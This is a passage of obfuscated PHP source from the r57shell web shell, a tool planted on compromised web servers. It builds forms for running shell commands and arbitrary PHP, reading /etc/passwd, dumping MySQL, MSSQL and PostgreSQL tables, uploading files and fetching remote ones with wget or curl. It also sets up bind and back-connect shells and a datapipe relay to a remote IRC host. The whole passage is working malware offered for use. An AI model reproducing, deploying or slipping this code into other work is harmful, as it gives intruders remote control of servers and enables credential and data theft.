'; $sp4fa71c .= $sp266f95; $spd6fdb8 = ''; $spfd181b = @mssql_query('SELECT * FROM ' . $_POST['mysql_tbl'] . '', $sp7a8f47); if (@mssql_num_rows($spfd181b) > 0) { while ($spa53ce4 = @mssql_fetch_assoc($spfd181b)) { $spa22ace = @implode(', ', @array_keys($spa53ce4)); $spe99d03 = @array_values($spa53ce4); foreach ($spe99d03 as $sp71a197 => $spe2ff4f) { $spe99d03[$sp71a197] = addslashes($spe2ff4f); } $spe99d03 = @implode('\', \'', $spe99d03); $spd6fdb8 .= 'INSERT INTO ' . $_POST['mysql_tbl'] . ' (' . $spa22ace . ') VALUES (\'' . htmlspecialchars($spe99d03) . '\');
'; } $spd6fdb8 .= '
# ---------------------------------'; } if (!empty($_POST['dif']) && $sp694629) { @fputs($sp694629, $sp4fa71c . $spd6fdb8); } else { echo $sp4fa71c . $spd6fdb8; } } else { echo '[-] ERROR! Can\'t select database'; } echo '[syslog]05
'; @mssql_close($sp7a8f47); } else { echo '[-] ERROR! Can\'t connect to MSSQL server'; } break; case 'PostgreSQL': if (empty($_POST['db_port'])) { $_POST['db_port'] = '5432'; } $sp6ff357 = 'host=\'localhost\' port=\'' . $_POST['db_port'] . '\' user=\'' . $_POST['mysql_l'] . '\' password=\'' . $_POST['mysql_p'] . '\' dbname=\'' . $_POST['mysql_db'] . '\''; $sp7a8f47 = @pg_connect($sp6ff357); if ($sp7a8f47) { $sp4fa71c = '# PostgreSQL dump created by r57shell
'; $sp4fa71c .= $sp266f95; $spd6fdb8 = ''; $spfd181b = @pg_query($sp7a8f47, 'SELECT * FROM ' . $_POST['mysql_tbl'] . ''); if (@pg_num_rows($spfd181b) > 0) { while ($spa53ce4 = @pg_fetch_assoc($spfd181b)) { $spa22ace = @implode(', ', @array_keys($spa53ce4)); $spe99d03 = @array_values($spa53ce4); foreach ($spe99d03 as $sp71a197 => $spe2ff4f) { $spe99d03[$sp71a197] = addslashes($spe2ff4f); } $spe99d03 = @implode('\', \'', $spe99d03); $spd6fdb8 .= 'INSERT INTO ' . $_POST['mysql_tbl'] . ' (' . $spa22ace . ') VALUES (\'' . htmlspecialchars($spe99d03) . '\');
'; } $spd6fdb8 .= '
# ---------------------------------'; } if (!empty($_POST['dif']) && $sp694629) { @fputs($sp694629, $sp4fa71c . $spd6fdb8); } else { echo $sp4fa71c . $spd6fdb8; } @pg_close($sp7a8f47); } else { echo '[-] ERROR! Can\'t connect to PostgreSQL server'; } break; } } else { if (!empty($_POST['dif']) && !$sp694629) { echo '[-] ERROR! Can\'t write in dump file'; } } } echo '</textarea></div>'; echo '</b>'; echo '</td></tr></table>'; echo '<table width=100% cellpadding=0 cellspacing=0>'; if (!$sp347c9a) { echo $spea02a2 . $sped9a11 . $spa872db[$sp53bb19 . '_text2'] . $sp2b74d6 . $sp65abe9; echo sr(15, '<b>' . $spa872db[$sp53bb19 . '_text3'] . $sp3975e2 . '</b>', in('text', 'cmd', 85, '')); echo sr(15, '<b>' . $spa872db[$sp53bb19 . '_text4'] . $sp3975e2 . '</b>', in('text', 'dir', 85, $spa25e24) . ws(4) . in('submit', 'submit', 0, $spa872db[$sp53bb19 . '_butt1'])); echo $sp8b2f4f . $spb0d409 . $spdb4689; } else { echo $spea02a2 . $sped9a11 . $spa872db[$sp53bb19 . '_text28'] . $sp2b74d6 . $sp65abe9; echo sr(15, '<b>' . $spa872db[$sp53bb19 . '_text4'] . $sp3975e2 . '</b>', in('text', 'dir', 85, $spa25e24) . in('hidden', 'cmd', 0, 'safe_dir') . ws(4) . in('submit', 'submit', 0, $spa872db[$sp53bb19 . '_butt6'])); echo $sp8b2f4f . $spb0d409 . $spdb4689; } echo $spea02a2 . $sped9a11 . $spa872db[$sp53bb19 . '_text42'] . $sp2b74d6 . $sp65abe9; echo sr(15, '<b>' . $spa872db[$sp53bb19 . '_text43'] . $sp3975e2 . '</b>', in('text', 'e_name', 85, $spa25e24) . in('hidden', 'cmd', 0, 'edit_file') . in('hidden', 'dir', 0, $spa25e24) . ws(4) . in('submit', 'submit', 0, $spa872db[$sp53bb19 . '_butt11'])); echo $sp8b2f4f . $spb0d409 . $spdb4689; if ($sp347c9a) { echo $spea02a2 . $sped9a11 . $spa872db[$sp53bb19 . '_text57'] . $sp2b74d6 . $sp65abe9; echo sr(15, '<b>' . $spa872db[$sp53bb19 . '_text58'] . $sp3975e2 . '</b>', in('text', 'mk_name', 54, !empty($_POST['mk_name']) ? $_POST['mk_name'] : 'new_name') . ws(4) . '<select name=action><option value=create>' . $spa872db[$sp53bb19 . '_text65'] . '</option><option value=delete>' . $spa872db[$sp53bb19 . '_text66'] . '</option></select>' . ws(3) . '<select name=what><option value=file>' . $spa872db[$sp53bb19 . '_text59'] . '</option><option value=dir>' . $spa872db[$sp53bb19 . '_text60'] . '</option></select>' . in('hidden', 'cmd', 0, 'mk') . in('hidden', 'dir', 0, $spa25e24) . ws(4) . in('submit', 'submit', 0, $spa872db[$sp53bb19 . '_butt13'])); echo $sp8b2f4f . $spb0d409 . $spdb4689; } if ($sp347c9a && $spcc2cff) { echo $spea02a2 . $sped9a11 . $spa872db[$sp53bb19 . '_text67'] . $sp2b74d6 . $sp65abe9; echo sr(15, '<b>' . $spa872db[$sp53bb19 . '_text68'] . $sp3975e2 . '</b>', '<select name=what><option value=mod>CHMOD</option><option value=own>CHOWN</option><option value=grp>CHGRP</option></select>' . ws(2) . '<b>' . $spa872db[$sp53bb19 . '_text69'] . $sp3975e2 . '</b>' . ws(2) . in('text', 'param1', 40, $_POST['param1'] ? $_POST['param1'] : 'filename') . ws(2) . '<b>' . $spa872db[$sp53bb19 . '_text70'] . $sp3975e2 . '</b>' . ws(2) . in('text', 'param2 title="' . $spa872db[$sp53bb19 . '_text71'] . '"', 26, $_POST['param2'] ? $_POST['param2'] : '0777') . in('hidden', 'cmd', 0, 'ch_') . in('hidden', 'dir', 0, $spa25e24) . ws(4) . in('submit', 'submit', 0, $spa872db[$sp53bb19 . '_butt1'])); echo $sp8b2f4f . $spb0d409 . $spdb4689; } if (!$sp347c9a) { foreach ($sp488c53 as $sp645c93 => $spbee152) { $sp53e84a .= "<option>{$sp645c93}</option>"; } echo $spea02a2 . $sped9a11 . $spa872db[$sp53bb19 . '_text7'] . $sp2b74d6 . $sp65abe9; echo sr(15, '<b>' . ws(9) . $spa872db[$sp53bb19 . '_text8'] . $sp3975e2 . ws(4) . '</b>', '<select name=alias>' . $sp53e84a . '</select>' . in('hidden', 'dir', 0, $spa25e24) . ws(4) . in('submit', 'submit', 0, $spa872db[$sp53bb19 . '_butt1'])); echo $sp8b2f4f . $spb0d409 . $spdb4689; } echo $spea02a2 . $sped9a11 . $spa872db[$sp53bb19 . '_text54'] . $sp2b74d6 . $sp65abe9; echo sr(15, '<b>' . $spa872db[$sp53bb19 . '_text52'] . $sp3975e2 . '</b>', in('text', 's_text', 85, 'text') . ws(4) . in('submit', 'submit', 0, $spa872db[$sp53bb19 . '_butt12'])); echo sr(15, '<b>' . $spa872db[$sp53bb19 . '_text53'] . $sp3975e2 . '</b>', in('text', 's_dir', 85, $spa25e24) . ' * ( /root;/home;/tmp )'); echo sr(15, '<b>' . $spa872db[$sp53bb19 . '_text55'] . $sp3975e2 . '</b>', in('checkbox', 'm id=m', 0, '1') . in('text', 's_mask', 82, '.txt;.php') . '* ( .txt;.php;.htm )' . in('hidden', 'cmd', 0, 'search_text') . in('hidden', 'dir', 0, $spa25e24)); echo $sp8b2f4f . $spb0d409 . $spdb4689; echo $spea02a2 . $sped9a11 . $spa872db[$sp53bb19 . '_text76'] . $sp2b74d6 . $sp65abe9; echo sr(15, '<b>' . $spa872db[$sp53bb19 . '_text72'] . $sp3975e2 . '</b>', in('text', 's_text', 85, 'text') . ws(4) . in('submit', 'submit', 0, $spa872db[$sp53bb19 . '_butt12'])); echo sr(15, '<b>' . $spa872db[$sp53bb19 . '_text73'] . $sp3975e2 . '</b>', in('text', 's_dir', 85, $spa25e24) . ' * ( /root;/home;/tmp )'); echo sr(15, '<b>' . $spa872db[$sp53bb19 . '_text74'] . $sp3975e2 . '</b>', in('text', 's_mask', 85, '*.[hc]') . ws(1) . $spa872db[$sp53bb19 . '_text75'] . in('hidden', 'cmd', 0, 'find_text') . in('hidden', 'dir', 0, $spa25e24)); echo $sp8b2f4f . $spb0d409 . $spdb4689; echo $spea02a2 . $sped9a11 . $spa872db[$sp53bb19 . '_text32'] . $sp2b74d6 . $sp262f43; echo '<div align=center><textarea name=php_eval cols=100 rows=3>'; echo !empty($_POST['php_eval']) ? $_POST['php_eval'] : '/* delete script */
//unlink("r57shell.php");
//readfile("/etc/passwd");'; echo '</textarea>'; echo in('hidden', 'dir', 0, $spa25e24) . in('hidden', 'cmd', 0, 'php_eval'); echo '<br>' . ws(1) . in('submit', 'submit', 0, $spa872db[$sp53bb19 . '_butt1']); echo '</font>'; echo $spb0d409 . $spdb4689; if ($sp347c9a && $sp01e19d) { echo $spea02a2 . $sped9a11 . $spa872db[$sp53bb19 . '_text33'] . $sp2b74d6 . $sp65abe9; echo sr(15, '<b>' . $spa872db[$sp53bb19 . '_text30'] . $sp3975e2 . '</b>', in('text', 'test1_file', 85, !empty($_POST['test1_file']) ? $_POST['test1_file'] : '/etc/passwd') . in('hidden', 'dir', 0, $spa25e24) . in('hidden', 'cmd', 0, 'test1') . ws(4) . in('submit', 'submit', 0, $spa872db[$sp53bb19 . '_butt8'])); echo $sp8b2f4f . $spb0d409 . $spdb4689; } if ($sp347c9a) { echo $spea02a2 . $sped9a11 . $spa872db[$sp53bb19 . '_text34'] . $sp2b74d6 . $sp65abe9; echo '<table class=table1 width=100% align=center>'; echo sr(15, '<b>' . $spa872db[$sp53bb19 . '_text30'] . $sp3975e2 . '</b>', in('text', 'test2_file', 85, !empty($_POST['test2_file']) ? $_POST['test2_file'] : '/etc/passwd') . in('hidden', 'dir', 0, $spa25e24) . in('hidden', 'cmd', 0, 'test2') . ws(4) . in('submit', 'submit', 0, $spa872db[$sp53bb19 . '_butt8'])); echo $sp8b2f4f . $spb0d409 . $spdb4689; } if ($sp347c9a && $sp8f7eea) { echo $spea02a2 . $sped9a11 . $spa872db[$sp53bb19 . '_text35'] . $sp2b74d6 . $sp65abe9; echo sr(15, '<b>' . $spa872db[$sp53bb19 . '_text36'] . $sp3975e2 . '</b>', in('text', 'test3_md', 15, !empty($_POST['test3_md']) ? $_POST['test3_md'] : 'mysql') . ws(4) . '<b>' . $spa872db[$sp53bb19 . '_text37'] . $sp3975e2 . '</b>' . in('text', 'test3_ml', 15, !empty($_POST['test3_ml']) ? $_POST['test3_ml'] : 'root') . ws(4) . '<b>' . $spa872db[$sp53bb19 . '_text38'] . $sp3975e2 . '</b>' . in('text', 'test3_mp', 15, !empty($_POST['test3_mp']) ? $_POST['test3_mp'] : 'password') . ws(4) . '<b>' . $spa872db[$sp53bb19 . '_text14'] . $sp3975e2 . '</b>' . in('text', 'test3_port', 15, !empty($_POST['test3_port']) ? $_POST['test3_port'] : '3306')); echo sr(15, '<b>' . $spa872db[$sp53bb19 . '_text30'] . $sp3975e2 . '</b>', in('text', 'test3_file', 96, !empty($_POST['test3_file']) ? $_POST['test3_file'] : '/etc/passwd') . in('hidden', 'dir', 0, $spa25e24) . in('hidden', 'cmd', 0, 'test3') . ws(4) . in('submit', 'submit', 0, $spa872db[$sp53bb19 . '_butt8'])); echo $sp8b2f4f . $spb0d409 . $spdb4689; } if ($sp347c9a && $sp8b9b3b) { echo $spea02a2 . $sped9a11 . $spa872db[$sp53bb19 . '_text85'] . $sp2b74d6 . $sp65abe9; echo sr(15, '<b>' . $spa872db[$sp53bb19 . '_text36'] . $sp3975e2 . '</b>', in('text', 'test4_md', 15, !empty($_POST['test4_md']) ? $_POST['test4_md'] : 'master') . ws(4) . '<b>' . $spa872db[$sp53bb19 . '_text37'] . $sp3975e2 . '</b>' . in('text', 'test4_ml', 15, !empty($_POST['test4_ml']) ? $_POST['test4_ml'] : 'sa') . ws(4) . '<b>' . $spa872db[$sp53bb19 . '_text38'] . $sp3975e2 . '</b>' . in('text', 'test4_mp', 15, !empty($_POST['test4_mp']) ? $_POST['test4_mp'] : 'password') . ws(4) . '<b>' . $spa872db[$sp53bb19 . '_text14'] . $sp3975e2 . '</b>' . in('text', 'test4_port', 15, !empty($_POST['test4_port']) ? $_POST['test4_port'] : '1433')); echo sr(15, '<b>' . $spa872db[$sp53bb19 . '_text3'] . $sp3975e2 . '</b>', in('text', 'test4_file', 96, !empty($_POST['test4_file']) ? $_POST['test4_file'] : 'dir') . in('hidden', 'dir', 0, $spa25e24) . in('hidden', 'cmd', 0, 'test4') . ws(4) . in('submit', 'submit', 0, $spa872db[$sp53bb19 . '_butt8'])); echo $sp8b2f4f . $spb0d409 . $spdb4689; } if (@ini_get('file_uploads')) { echo '<form name=upload method=POST ENCTYPE=multipart/form-data>'; echo $sped9a11 . $spa872db[$sp53bb19 . '_text5'] . $sp2b74d6 . $sp65abe9; echo sr(15, '<b>' . $spa872db[$sp53bb19 . '_text6'] . $sp3975e2 . '</b>', in('file', 'userfile', 85, '')); echo sr(15, '<b>' . $spa872db[$sp53bb19 . '_text21'] . $sp3975e2 . '</b>', in('checkbox', 'nf1 id=nf1', 0, '1') . in('text', 'new_name', 82, '') . in('hidden', 'dir', 0, $spa25e24) . ws(4) . in('submit', 'submit', 0, $spa872db[$sp53bb19 . '_butt2'])); echo $sp8b2f4f . $spb0d409 . $spdb4689; } if (!$sp347c9a && !$sp3375c3) { echo $spea02a2 . $sped9a11 . $spa872db[$sp53bb19 . '_text15'] . $sp2b74d6 . $sp65abe9; echo sr(15, '<b>' . $spa872db[$sp53bb19 . '_text16'] . $sp3975e2 . '</b>', '<select size="1" name="with"><option value="wget">wget</option><option value="fetch">fetch</option><option value="lynx">lynx</option><option value="links">links</option><option value="curl">curl</option><option value="GET">GET</option></select>' . in('hidden', 'dir', 0, $spa25e24) . ws(2) . '<b>' . $spa872db[$sp53bb19 . '_text17'] . $sp3975e2 . '</b>' . in('text', 'rem_file', 78, 'http://')); echo sr(15, '<b>' . $spa872db[$sp53bb19 . '_text18'] . $sp3975e2 . '</b>', in('text', 'loc_file', 105, $spa25e24) . ws(4) . in('submit', 'submit', 0, $spa872db[$sp53bb19 . '_butt2'])); echo $sp8b2f4f . $spb0d409 . $spdb4689; } if ($sp8f7eea || $sp8b9b3b || $sp0af35a || $spe710a8) { echo $sped9a11 . $spa872db[$sp53bb19 . '_text82'] . $sp2b74d6 . $sp65abe9 . '<tr>' . $spea02a2 . '<td valign=top width=34%>' . $sp65abe9; echo '<font face=Verdana size=-2><b><div align=center>' . $spa872db[$sp53bb19 . '_text77'] . '</div></b></font>'; echo sr(45, '<b>' . $spa872db[$sp53bb19 . '_text80'] . $sp3975e2 . '</b>', '<select name=db><option>MySQL</option><option>MSSQL</option><option>PostgreSQL</option></select>'); echo sr(45, '<b>' . $spa872db[$sp53bb19 . '_text14'] . $sp3975e2 . '</b>', in('text', 'db_port', 15, !empty($_POST['db_port']) ? $_POST['db_port'] : '3306')); echo sr(45, '<b>' . $spa872db[$sp53bb19 . '_text37'] . $sp3975e2 . '</b>', in('text', 'mysql_l', 15, !empty($_POST['mysql_l']) ? $_POST['mysql_l'] : 'root')); echo sr(45, '<b>' . $spa872db[$sp53bb19 . '_text38'] . $sp3975e2 . '</b>', in('text', 'mysql_p', 15, !empty($_POST['mysql_p']) ? $_POST['mysql_p'] : 'password')); echo sr(45, '<b>' . $spa872db[$sp53bb19 . '_text78'] . $sp3975e2 . '</b>', in('hidden', 'dir', 0, $spa25e24) . in('hidden', 'cmd', 0, 'db_show') . in('checkbox', 'st id=st', 0, '1')); echo sr(45, '<b>' . $spa872db[$sp53bb19 . '_text79'] . $sp3975e2 . '</b>', in('checkbox', 'sc id=sc', 0, '1')); echo sr(45, '', in('submit', 'submit', 0, $spa872db[$sp53bb19 . '_butt7'])); echo $sp8b2f4f . '</td>' . $spdb4689 . $spea02a2 . '<td valign=top width=33%>' . $sp65abe9; echo '<font face=Verdana size=-2><b><div align=center>' . $spa872db[$sp53bb19 . '_text40'] . '</div></b></font>'; echo sr(45, '<b>' . $spa872db[$sp53bb19 . '_text80'] . $sp3975e2 . '</b>', '<select name=db><option>MySQL</option><option>MSSQL</option><option>PostgreSQL</option></select>'); echo sr(45, '<b>' . $spa872db[$sp53bb19 . '_text14'] . $sp3975e2 . '</b>', in('text', 'db_port', 15, !empty($_POST['db_port']) ? $_POST['db_port'] : '3306')); echo sr(45, '<b>' . $spa872db[$sp53bb19 . '_text37'] . $sp3975e2 . '</b>', in('text', 'mysql_l', 15, !empty($_POST['mysql_l']) ? $_POST['mysql_l'] : 'root')); echo sr(45, '<b>' . $spa872db[$sp53bb19 . '_text38'] . $sp3975e2 . '</b>', in('text', 'mysql_p', 15, !empty($_POST['mysql_p']) ? $_POST['mysql_p'] : 'password')); echo sr(45, '<b>' . $spa872db[$sp53bb19 . '_text36'] . $sp3975e2 . '</b>', in('text', 'mysql_db', 15, !empty($_POST['mysql_db']) ? $_POST['mysql_db'] : 'mysql')); echo sr(45, '<b>' . $spa872db[$sp53bb19 . '_text39'] . $sp3975e2 . '</b>', in('text', 'mysql_tbl', 15, !empty($_POST['mysql_tbl']) ? $_POST['mysql_tbl'] : 'user')); echo sr(45, in('hidden', 'dir', 0, $spa25e24) . in('hidden', 'cmd', 0, 'mysql_dump') . '<b>' . $spa872db[$sp53bb19 . '_text41'] . $sp3975e2 . '</b>', in('checkbox', 'dif id=dif', 0, '1')); echo sr(45, '<b>' . $spa872db[$sp53bb19 . '_text59'] . $sp3975e2 . '</b>', in('text', 'dif_name', 15, !empty($_POST['dif_name']) ? $_POST['dif_name'] : 'dump.sql')); echo sr(45, '', in('submit', 'submit', 0, $spa872db[$sp53bb19 . '_butt9'])); echo $sp8b2f4f . '</td>' . $spdb4689 . $spea02a2 . '<td valign=top width=33%>' . $sp65abe9; echo '<font face=Verdana size=-2><b><div align=center>' . $spa872db[$sp53bb19 . '_text83'] . '</div></b></font>'; echo sr(45, '<b>' . $spa872db[$sp53bb19 . '_text80'] . $sp3975e2 . '</b>', '<select name=db><option>MySQL</option><option>MSSQL</option><option>PostgreSQL</option><option>Oracle</option></select>'); echo sr(45, '<b>' . $spa872db[$sp53bb19 . '_text14'] . $sp3975e2 . '</b>', in('text', 'db_port', 15, !empty($_POST['db_port']) ? $_POST['db_port'] : '3306')); echo sr(45, '<b>' . $spa872db[$sp53bb19 . '_text37'] . $sp3975e2 . '</b>', in('text', 'mysql_l', 15, !empty($_POST['mysql_l']) ? $_POST['mysql_l'] : 'root')); echo sr(45, '<b>' . $spa872db[$sp53bb19 . '_text38'] . $sp3975e2 . '</b>', in('text', 'mysql_p', 15, !empty($_POST['mysql_p']) ? $_POST['mysql_p'] : 'password')); echo sr(45, '<b>' . $spa872db[$sp53bb19 . '_text36'] . $sp3975e2 . '</b>', in('text', 'mysql_db', 15, !empty($_POST['mysql_db']) ? $_POST['mysql_db'] : 'mysql')); echo sr(45, '<b>' . $spa872db[$sp53bb19 . '_text84'] . $sp3975e2 . '</b>' . in('hidden', 'dir', 0, $spa25e24) . in('hidden', 'cmd', 0, 'db_query'), ''); echo $sp8b2f4f . '<div align=center><textarea cols=35 name=db_query>' . (!empty($_POST['db_query']) ? $_POST['db_query'] : 'SHOW DATABASES;
SELECT * FROM user;') . '</textarea><br>' . in('submit', 'submit', 0, $spa872db[$sp53bb19 . '_butt1']) . '</div></td>' . $spdb4689 . '</tr></table>'; } if (!$sp347c9a && !$sp3375c3) { echo $sped9a11 . $spa872db[$sp53bb19 . '_text81'] . $sp2b74d6 . $sp65abe9 . '<tr>' . $spea02a2 . '<td valign=top width=34%>' . $sp65abe9; echo '<font face=Verdana size=-2><b><div align=center>' . $spa872db[$sp53bb19 . '_text9'] . '</div></b></font>'; echo sr(40, '<b>' . $spa872db[$sp53bb19 . '_text10'] . $sp3975e2 . '</b>', in('text', 'port', 15, '11457')); echo sr(40, '<b>' . $spa872db[$sp53bb19 . '_text11'] . $sp3975e2 . '</b>', in('text', 'bind_pass', 15, 'r57')); echo sr(40, '<b>' . $spa872db[$sp53bb19 . '_text20'] . $sp3975e2 . '</b>', '<select size="1" name="use"><option value="Perl">Perl</option><option value="C">C</option></select>' . in('hidden', 'dir', 0, $spa25e24)); echo sr(40, '', in('submit', 'submit', 0, $spa872db[$sp53bb19 . '_butt3'])); echo $sp8b2f4f . '</td>' . $spdb4689 . $spea02a2 . '<td valign=top width=33%>' . $sp65abe9; echo '<font face=Verdana size=-2><b><div align=center>' . $spa872db[$sp53bb19 . '_text12'] . '</div></b></font>'; echo sr(40, '<b>' . $spa872db[$sp53bb19 . '_text13'] . $sp3975e2 . '</b>', in('text', 'ip', 15, getenv('REMOTE_ADDR') ? getenv('REMOTE_ADDR') : '127.0.0.1')); echo sr(40, '<b>' . $spa872db[$sp53bb19 . '_text14'] . $sp3975e2 . '</b>', in('text', 'port', 15, '11457')); echo sr(40, '<b>' . $spa872db[$sp53bb19 . '_text20'] . $sp3975e2 . '</b>', '<select size="1" name="use"><option value="Perl">Perl</option><option value="C">C</option></select>' . in('hidden', 'dir', 0, $spa25e24)); echo sr(40, '', in('submit', 'submit', 0, $spa872db[$sp53bb19 . '_butt4'])); echo $sp8b2f4f . '</td>' . $spdb4689 . $spea02a2 . '<td valign=top width=33%>' . $sp65abe9; echo '<font face=Verdana size=-2><b><div align=center>' . $spa872db[$sp53bb19 . '_text22'] . '</div></b></font>'; echo sr(40, '<b>' . $spa872db[$sp53bb19 . '_text23'] . $sp3975e2 . '</b>', in('text', 'local_port', 15, '11457')); echo sr(40, '<b>' . $spa872db[$sp53bb19 . '_text24'] . $sp3975e2 . '</b>', in('text', 'remote_host', 15, 'jade.va.us.dal.net')); echo sr(40, '<b>' . $spa872db[$sp53bb19 . '_text25'] . $sp3975e2 . '</b>', in('text', 'remote_port', 15, '6667')); echo sr(40, '<b>' . $spa872db[$sp53bb19 . '_text26'] . $sp3975e2 . '</b>', '<select size="1" name="use"><option value="Perl">datapipe.pl</option><option value="C">datapipe.c</option></select>' . in('hidden', 'dir', 0, $spa25e24)); echo sr(40, '', in('submit', 'submit', 0, $spa872db[$sp53bb19 . '_butt5'])); echo $sp8b2f4f . '</td>' . $spdb4689 . '</tr></table>'; } echo $sp873d14 . '<div align=center><font face=Verdana size=-2><b>[ r57shell - Modification By iFX | version ' . $sp1968ee . ' ]</b></font></div></td></tr></table>' . $sp224638; echo '[syslog]06
';